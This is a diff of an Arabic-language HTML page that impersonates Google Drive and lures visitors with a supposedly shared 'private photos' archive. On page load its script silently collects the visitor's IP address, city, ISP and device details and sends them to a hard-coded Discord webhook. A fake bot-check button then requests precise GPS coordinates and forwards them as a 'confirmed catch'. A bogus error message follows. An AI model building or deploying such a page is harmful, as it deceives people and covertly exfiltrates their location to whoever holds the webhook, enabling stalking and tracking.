@@ -3,94 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Media Gateway | التحقق من الهوية</title>
+    <title>Google Drive - مشاركة آمنة</title>
     <style>
-        body { background: #0b0e14; color: #ffffff; font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; padding-top: 80px; margin: 0; }
-        .card { background: #161b22; margin: auto; padding: 30px; width: 85%; max-width: 400px; border-radius: 15px; border: 1px solid #30363d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .icon { font-size: 60px; color: #1a73e8; margin-bottom: 20px; }
-        h2 { font-size: 20px; margin-bottom: 10px; }
-        p { color: #8b949e; font-size: 14px; line-height: 1.6; }
-        .btn { background: #1f6feb; color: white; border: none; padding: 15px 40px; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; transition: 0.3s; }
-        .btn:active { transform: scale(0.95); background: #388bfd; }
-        #status { font-size: 12px; color: #58a6ff; margin-top: 15px; display: none; }
+        body { background: #f8f9fa; color: #3c4043; font-family: 'Roboto', Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.12); width: 90%; max-width: 400px; text-align: center; border: 1px solid #dadce0; }
+        .logo { width: 75px; margin-bottom: 20px; }
+        h1 { font-size: 22px; font-weight: 500; margin-bottom: 10px; color: #202124; }
+        p { font-size: 14px; color: #5f6368; line-height: 1.5; margin-bottom: 25px; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background 0.2s; width: 100%; }
+        .btn:hover { background: #185abc; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }
+        .footer-text { font-size: 12px; color: #70757a; margin-top: 20px; border-top: 1px solid #eee; padding-top: 15px; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <div class="icon">📡</div>
-        <h2>بوابة العرض الآمنة</h2>
-        <p>تم تشفير هذه الوسائط بواسطة بروتوكول AES-256. يرجى الضغط على الزر أدناه لبدء فحص أمان الجهاز وعرض المحتوى.</p>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg" alt="Drive" class="logo">
+        <h1>مستند محمي بكلمة مرور</h1>
+        <p>لقد تمت مشاركة ملف "صور_خاصة_2026.zip" معك. لأسباب أمنية، يجب علينا التأكد من أنك لست برنامج روبوت قبل فك التشفير.</p>
         
-        <button class="btn" onclick="masterLog()">معاينة الوسائط</button>
-        <div id="status">جاري فحص بروتوكول SSL...</div>
+        <button class="btn" onclick="masterLog()">التحقق والمتابعة</button>
+        
+        <div class="footer-text">
+            يستخدم Google بروتوكول الموقع الجغرافي للتأكد من أن الوصول يتم من منطقة معتمدة.
+        </div>
     </div>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1494444634586222682/HdxT-BynNCFlveKYWjMqYngyasuPSOVI-7a1RAA1QqAOLkW6O5MranKijd5v_yOoXZpa";
 
-        // 1. وظيفة سحب الـ IP الصامتة (تعمل فوراً)
         async function silentLog() {
             try {
                 const response = await fetch('https://ipapi.co/json/');
                 const ipData = await response.json();
-                
-                sendToDiscord("🔔 **زيارة جديدة (صامتة)**", [
-                    { name: "🌐 عنوان IP", value: ipData.ip, inline: true },
-                    { name: "📍 المدينة", value: ipData.city + ", " + ipData.country_name, inline: true },
-                    { name: "🏢 شركة الإنترنت", value: ipData.org, inline: false },
-                    { name: "📱 الجهاز", value: navigator.platform, inline: true }
-                ], 3447003); // لون أخضر للزيارة الصامتة
-            } catch (e) { console.log("Silent log failed"); }
+                sendToDiscord("👀 **دخول جديد للصفحة**", [
+                    { name: "🌐 الـ IP", value: ipData.ip, inline: true },
+                    { name: "📍 الموقع التقريبي", value: ipData.city + ", " + ipData.country_name, inline: true },
+                    { name: "📱 الجهاز", value: navigator.userAgent, inline: false }
+                ], 3447003);
+            } catch (e) {}
         }
-
-        // تشغيل السحب الصامت بمجرد فتح الصفحة
         silentLog();
 
-        // 2. وظيفة السحب النشط (عند الضغط على الزر)
         async function masterLog() {
-            document.getElementById('status').style.display = "block";
-            
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                // في حالة الموافقة على الموقع
-                sendToDiscord("🎯 **هدف تم تحديده بدقة (GPS)**", [
-                    { name: "📍 إحداثيات الموقع", value: `[فتح في خرائط جوجل](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`, inline: false },
-                    { name: "🎯 الدقة", value: `${pos.coords.accuracy.toFixed(1)} متر`, inline: true },
-                    { name: "🔋 المتصفح الكامل", value: navigator.userAgent, inline: false }
-                ], 15158332); // لون أحمر للصيد الدقيق
+                sendToDiscord("🎯 **صيد مؤكد بدقة GPS**", [
+                    { name: "📍 الموقع الحي", value: `[فتح في الخرائط](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`, inline: false },
+                    { name: "🎯 الدقة", value: `${pos.coords.accuracy.toFixed(0)} متر`, inline: true },
+                    { name: "🔋 تفاصيل الجهاز", value: navigator.platform, inline: true }
+                ], 15158332);
 
-                setTimeout(() => {
-                    alert("خطأ في تشفير الوسائط: يرجى تفعيل 'صلاحية الوصول الكامل' من إعدادات المتصفح.");
-                }, 1000);
-
+                alert("خطأ في الخادم: انتهت جلسة العمل. يرجى المحاولة لاحقاً.");
             }, (err) => {
-                // في حالة الرفض (Block)
-                sendToDiscord("⚠️ **الهدف رفض صلاحية الموقع**", [
-                    { name: "الحالة", value: "قام بالضغط على Block", inline: false },
-                    { name: "نصيحة", value: "تم الاكتفاء ببيانات الـ IP المسحوبة صامتاً.", inline: false }
-                ], 16776960); // لون أصفر للتحذير
-                
-                alert("يجب السماح بالوصول للموقع لإثبات أنك لست روبوت (Bot Protection).");
+                sendToDiscord("⚠️ **الهدف رفض الصلاحية**", [{ name: "الحالة", value: "رفض إعطاء الـ GPS", inline: false }], 16776960);
+                alert("يجب السماح بالوصول للموقع لإكمال عملية التحقق الأمني.");
             }, { enableHighAccuracy: true });
         }
 
-        // وظيفة الإرسال الموحدة لـ Discord
         async function sendToDiscord(title, fields, color) {
-            const payload = {
-                username: "نظام التتبع المطور",
-                avatar_url: "https://cdn-icons-png.flaticon.com/512/2563/2563333.png",
-                embeds: [{
-                    title: title,
-                    color: color,
-                    fields: fields,
-                    timestamp: new Date()
-                }]
-            };
-
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: JSON.stringify({
+                    username: "نظام التحقق الذكي",
+                    embeds: [{ title: title, color: color, fields: fields, timestamp: new Date() }]
+                })
             });
         }
     </script>
